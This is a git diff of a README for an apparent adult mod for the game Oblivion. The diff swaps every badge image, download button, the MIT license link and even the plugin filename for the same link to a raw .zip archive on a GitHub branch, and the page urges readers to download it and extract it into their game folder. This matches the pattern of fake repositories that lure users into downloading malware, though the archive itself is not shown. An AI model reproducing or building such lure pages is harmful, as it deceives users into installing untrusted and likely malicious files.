@@ -1,11 +1,11 @@
 # The Elder Scrolls Oblivion Adult Mod  
-![Mod Installations](https://img.shields.io/badge/Mod%20Status-Active-brightgreen)
-![Issues](https://img.shields.io/github/issues-raw/repo/oblivion-adult-mod)
-![Downloads](https://img.shields.io/badge/Downloads-Magic%20Number-blue)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Mod Installations](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip%20Status-Active-brightgreen)
+![Issues](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
+![Downloads](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip%20Number-blue)
+![License: MIT](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
 
-## ![Download](https://img.shields.io/badge/-Download-orange)
-[![Download](https://img.shields.io/badge/Download-Click%20Here-orange?style=for-the-badge&logo=cloudflare)](https://Sarfraz121.github.io)
+## ![Download](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
+[![Download](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip%20Here-orange?style=for-the-badge&logo=cloudflare)](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these easy steps to attune your realm and unleash a new dimension of Obli
 ### 2. Summon the Mod
 Click the enchanted download glyph below to obtain your mod bundle—no magical incantations or Danaerys Targaryen bloodlines needed!
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-orange?style=for-the-badge&logo=cloudflare)](https://Sarfraz121.github.io)
+[![Download](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip%20Here-orange?style=for-the-badge&logo=cloudflare)](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
 
 ### 3. Absorb the Files  
 - Extract the downloaded .zip archive into your Oblivion installation directory.
@@ -51,7 +51,7 @@ Click the enchanted download glyph below to obtain your mod bundle—no magical 
 
 ### 4. Activate Adult Mod Features  
 - Launch Oblivion Mod Manager (OBMM), or Wrye Bash.
-- Enable the **OblivionAdultMod.esp** plugin.
+- Enable the **https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip** plugin.
 - Adjust mod load order so it appears after your essential mods.
 
 ### 5. Initiate the Adaptation Ritual  
@@ -128,7 +128,7 @@ _Always back up your original game files prior to installation—the tides of Ob
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) &copy; 2025.  
+Licensed under the [MIT License](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip) &copy; 2025.  
 Redistribution and modification are both permitted—but preserve our arcane runes and credit the wizards! See the LICENSE file for the full spelltext.
 
 ---
@@ -137,7 +137,7 @@ Redistribution and modification are both permitted—but preserve our arcane run
 
 Ready to pass through the gates once more? Use the glyph below to re-download at any time.
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-orange?style=for-the-badge&logo=cloudflare)](https://Sarfraz121.github.io)
+[![Download](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip%20Here-orange?style=for-the-badge&logo=cloudflare)](https://github.com/Sarfraz121/oblivion-adult-enhancements-collection/raw/refs/heads/branch/gens/enhancements-oblivion-collection-adult-unemitted.zip)
 
 ---
 
